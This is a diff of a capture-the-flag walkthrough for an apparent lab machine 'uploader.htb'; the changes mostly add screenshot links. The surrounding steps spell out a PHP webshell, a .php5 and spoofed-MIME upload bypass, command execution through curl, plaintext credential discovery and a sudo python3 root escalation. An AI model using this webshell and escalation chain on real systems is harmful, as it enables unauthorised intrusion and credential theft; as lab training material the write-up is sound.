@@ -16,7 +16,7 @@ escalation via sudo misconfiguration.
 | root     | -         | Via privesc   |
 
 ### Key Processes
-![Nmap Scan](./Screenshot_2026-06-26_13-48-14.png)
+
 
 **Apache2** runs as `www-data` on port 80, serving a 
 custom PHP photo blog. The upload functionality at 
@@ -52,10 +52,12 @@ nmap -sV -sC {MACHINE_IP}
 Open ports:
 - Port 22: SSH (OpenSSH 9.6p1)
 - Port 80: HTTP (Apache 2.4.58)
+- ![Nmap Scan](./Screenshot_2026-06-26_13-48-52.png)
 
 #### STEP 2:- Web Enumeration
 Check {MACHINE_IP} in browser then you get uploader.htb so you have to 
 add this MACHINE_IP and url in /etc/hosts 
+![Nmap Scan](./Screenshot_2026-06-26_13-48-32.png)
 
 using nano /etc/hosts
 
@@ -67,6 +69,7 @@ then you see web blogs and go to upload section
 The upload form blocks .php files but does not block 
 .php5 extension. By also spoofing the MIME type to 
 image/jpeg, the filter is bypassed.
+![Nmap Scan](./Screenshot_2026-06-26_13-48-14.png)
 
 Create webshell:
 echo '<?php system($_GET["cmd"]); ?>' > shell.php5
@@ -74,22 +77,29 @@ echo '<?php system($_GET["cmd"]); ?>' > shell.php5
 Upload with spoofed MIME:
 curl -X POST http://uploader.htb/panel/index.php \
   -F "file=@shell.php5;type=image/jpeg"
+  ![Nmap Scan](./Screenshot_2026-06-26_13-49-16.png)
 
 #### STEP 5:- RCE
 curl "http://uploader.htb/uploads/shell.php5?cmd=id"
 Output: uid=33(www-data)
+![Nmap Scan](./Screenshot_2026-06-26_13-49-29.png)
 
 #### STEP 6:- Credential Discovery
 curl "http://uploader.htb/uploads/shell.php5?cmd=cat+/var/www/html/config.php"
 Output: ayush : ayush@123
+![Nmap Scan](./Screenshot_2026-06-26_13-49-39.png)
 
 ### STEP 7:- Lateral Movement
 ssh ayush@{MACHINE_IP}
+![Nmap Scan](./Screenshot_2026-06-26_13-49-51.png)
 cat /home/ayush/user.txt
+![Nmap Scan](./Screenshot_2026-06-26_13-50-04.png)
 
 ### STEP 8:- Privilege Escalation
 sudo -l
 Output: (ALL) NOPASSWD: /usr/bin/python3
+![Nmap Scan](./Screenshot_2026-06-26_13-50-14.png)
 
 sudo python3 -c 'import os; os.system("/bin/bash")'
+![Nmap Scan](./Screenshot_2026-06-26_13-50-24.png)
 cat /root/root.txt
